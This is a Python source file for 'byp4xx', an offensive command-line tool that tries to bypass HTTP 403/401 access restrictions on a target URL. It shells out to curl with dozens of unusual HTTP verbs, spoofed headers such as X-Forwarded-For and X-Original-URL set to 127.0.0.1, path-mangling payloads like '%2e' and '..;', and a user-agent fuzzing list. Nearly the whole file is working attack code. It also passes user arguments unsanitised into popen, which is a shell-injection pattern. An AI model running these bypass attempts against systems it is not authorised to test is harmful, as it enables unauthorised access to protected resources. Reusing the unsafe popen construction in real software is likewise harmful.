#!/usr/bin/python3
import sys
from os import popen


def banner():
	print('\033[92m    __                 \033[91m__ __           ')
	print('\033[92m   / /_  __  ______   \033[91m/ // / _  ___  __')
	print('\033[92m  / __ \/ / / / __ \ \033[91m/ // /_| |/_/ |/_/')
	print('\033[92m / /_/ / /_/ / /_/ /\033[91m/__  __/>  <_>  <  ')
	print('\033[92m/_.___/\__, / .___/   \033[91m/_/ /_/|_/_/|_|  ')
	print('\033[92m      /____/_/                        ')
	print('by: @lobuhisec \033[0m')
	print('')

#Defining the standard curl calling. Default options used: -k -s -I (HEAD method) 
#Code is returned already colored
def curl_code_response(options_var, payload_var):
	code = popen("curl -k -s -I %s %s" % (options_var, payload_var)).read()

	#If we use -x proxy curl option then we must take the third line of the response
	if "-x" in options_var:
		code = code.split('\n',3)[2]
	else:
		code = code.split('\n',1)[0]

	try:
		status = code.split(" ")[1] # Status code is in second position
	except:
		print("\033[91m Status not found \033[0m")
		return # consider using sys.exit(1)

	#200=GREEN
	if status == "200":
		code = "\033[92m"+code+"\033[0m"
	#30X=ORANGE
	elif status.startswith("30"):
		code = "\033[93m"+code+" TIP: Consider to use -L option to follow redirections\033[0m"
	#40X or 50X=RED
	elif  status.startswith("40") or  status.startswith("50"):
		code = "\033[91m"+code+"\033[0m"
	return code

def main():
	#Check all params
	if len(sys.argv)<2:
		print("Usage: ./byp4xx <cURL options> <target>")
		sys.exit(1)

	#Parse curl options and target from args
	options = ' '.join(sys.argv[1:len(sys.argv)-1])
	target = sys.argv[len(sys.argv)-1]

	#Check if URL starts with http/https
	if not target.startswith("http"):
		print("Usage: ./byp4xx <cURL options> <target>")	
		print("URL parameter does not start with http:// or https://")
		sys.exit(1)

	#Count "/" on target param just to parse the last part of URI path
	bar_count = target.count("/")
	if target.endswith("/"):
		bar_count = bar_count -1

	if bar_count == 2:
		url = target
		uri = ""
	else:
		aux =  target.split("/")
		url = "/".join(aux[:bar_count])
		uri = aux[bar_count]

	###########TESTS start here!!!!
	print('\033[92m\033[1m[+]VERB TAMPERING\033[0m')
	payload = url + "/" + uri
	print("ACL: ",curl_code_response(options+" -X ACL",payload))
	print("ARBITRARY: ",curl_code_response(options+" -X ARBITRARY",payload))
	print("BASELINE-CONTROL: ",curl_code_response(options+" -X BASELINE-CONTROL",payload))
	print("CHECKIN: ",curl_code_response(options+" -X CHECKIN",payload))
	print("CHECKOUT: ",curl_code_response(options+" -X CHECKOUT",payload))
	print("CONNECT: ",curl_code_response(options+" -X CONNECT",payload))
	print("COPY: ",curl_code_response(options+" -X COPY",payload))
	#print("GET: ",curl_code_response(options+" -X DELETE",payload)) #too dangerous!
	print("GET: ",curl_code_response(options+" -X GET",payload))
	print("HEAD: ",curl_code_response(options+" -X HEAD -m 1",payload))
	print("LABEL: ",curl_code_response(options+" -X LABEL",payload))
	print("LOCK: ",curl_code_response(options+" -X LOCK",payload))
	print("MERGE: ",curl_code_response(options+" -X MERGE",payload))
	print("MKACTIVITY: ",curl_code_response(options+" -X MKACTIVITY",payload))
	print("MKCOL: ",curl_code_response(options+" -X MKCOL",payload))
	print("MKWORKSPACE: ",curl_code_response(options+" -X MKWORKSPACE",payload))
	print("MOVE: ",curl_code_response(options+" -X MOVE",payload))
	print("OPTIONS: ",curl_code_response(options+" -X OPTIONS",payload))
	print("ORDERPATCH: ",curl_code_response(options+" -X ORDERPATCH",payload))
	print("PATCH: ",curl_code_response(options+" -X PATCH",payload))
	print("POST: ",curl_code_response(options+" -X POST",payload))
	print("PROPFIND: ",curl_code_response(options+" -X PROPFIND",payload))
	print("PROPPATCH: ",curl_code_response(options+" -X PROPPATCH",payload))
	print("PUT: ",curl_code_response(options+" -X PUT",payload))
	print("REPORT: ",curl_code_response(options+" -X REPORT",payload))
	print("SEARCH: ",curl_code_response(options+" -X SEARCH",payload))
	print("TRACE: ",curl_code_response(options+" -X TRACE",payload))
	print("UNCHECKOUT: ",curl_code_response(options+" -X UNCHECKOUT",payload))
	print("UNLOCK: ",curl_code_response(options+" -X UNLOCK",payload))
	print("UPDATE: ",curl_code_response(options+" -X UPDATE",payload))
	print("VERSION-CONTROL: ",curl_code_response(options+" -X VERSION-CONTROL",payload))
	print("")
	###########HEADERS
	print('\033[92m\033[1m[+]HEADERS\033[0m')
	print("Referer: ",curl_code_response(options+" -X GET -H \"Referer: "+payload+"\"",payload))
	print("X-Custom-IP-Authorization: ",curl_code_response(options+" -X GET -H \"X-Custom-IP-Authorization: 127.0.0.1\"",payload))
	payload=url+"/"+uri+"..\;"
	print("X-Custom-IP-Authorization + ..;: ",curl_code_response(options+" -X GET -H \"X-Custom-IP-Authorization: 127.0.0.1\"",payload))
	payload=url+"/"
	print("X-Original-URL: ",curl_code_response(options+" -X GET -H \"X-Original-URL: /"+uri+"\"",payload))
	print("X-Rewrite-URL: ",curl_code_response(options+" -X GET -H \"X-Rewrite-URL: /"+uri+"\"",payload))
	payload=url+"/"+uri
	print("X-Originating-IP: ",curl_code_response(options+" -X GET -H \"X-Originating-IP: 127.0.0.1\"",payload))
	print("X-Forwarded-For: ",curl_code_response(options+" -X GET -H \"X-Forwarded-For: 127.0.0.1\"",payload))
	print("X-Remote-IP: ",curl_code_response(options+" -X GET -H \"X-Remote-IP: 127.0.0.1\"",payload))
	print("X-Client-IP: ",curl_code_response(options+" -X GET -H \"X-Client-IP: 127.0.0.1\"",payload))
	print("X-Host: ",curl_code_response(options+" -X GET -H \"X-Host: 127.0.0.1\"",payload))
	print("X-Forwarded-Host: ",curl_code_response(options+" -X GET -H \"X-Forwarded-Host: 127.0.0.1\"",payload))
	print("")
	###########BUGBOUNTY
	print('\033[92m\033[1m[+]#BUGBOUNTYTIPS\033[0m')
	payload=url+"/%2e/"+uri
	print("%2e: ",curl_code_response(options+" -X GET",payload))
	payload=url+"/"+uri+"/."
	print("Ends with /.: ",curl_code_response(options+" -X GET --path-as-is",payload))
	payload=url+"/"+uri+"?"
	print("Ends with ?: ",curl_code_response(options+" -X GET",payload))
	payload=url+"/"+uri+"??"
	print("Ends with ??: ",curl_code_response(options+" -X GET",payload))
	payload=url+"/"+uri+"//"
	print("Ends with //: ",curl_code_response(options+" -X GET",payload))
	payload=url+"/./"+uri+"/./"
	print("Between /./: ",curl_code_response(options+" -X GET --path-as-is",payload))
	payload=url+"/"+uri+"/"
	print("Ends with /: ",curl_code_response(options+" -X GET",payload))
	payload=url+"/"+uri+"/.randomstring"
	print("Ends with .randomstring: ",curl_code_response(options+" -X GET",payload))
	payload=url+"/"+uri+"..\;/"
	print("Ends with ..;: ",curl_code_response(options+" -X GET --path-as-is",payload))
	payload=url+"/.\;/"+uri
	print("Between /.;/: ",curl_code_response(options+" -X GET --path-as-is",payload))
	payload=url+"\;foo=bar/"+uri
	print("Between ;foo=bar;/: ",curl_code_response(options+" -X GET --path-as-is",payload))
	print("")
	###########UserAgents
	payload=url+"/"+uri
	response=input("Do you want to try with UserAgents.fuzz.txt from SecList? (2454 requests) [y/N]: ")
	if response.lower() == 'n' or response == "":
		sys.exit(1)
	else:
		print('\033[92m\033[1m[+]UserAgents\033[0m')
		with open("UserAgents.fuzz.txt") as file:  
			for line in file:
				print(line.strip()+":"+curl_code_response(options+" -X GET -H \"User-Agent: "+line.strip()+"\"",payload))


if __name__ == "__main__":
	try:
		banner()
		main()
	except KeyboardInterrupt:
		print("Aborting...")
	except Exception as e:
		print(e)
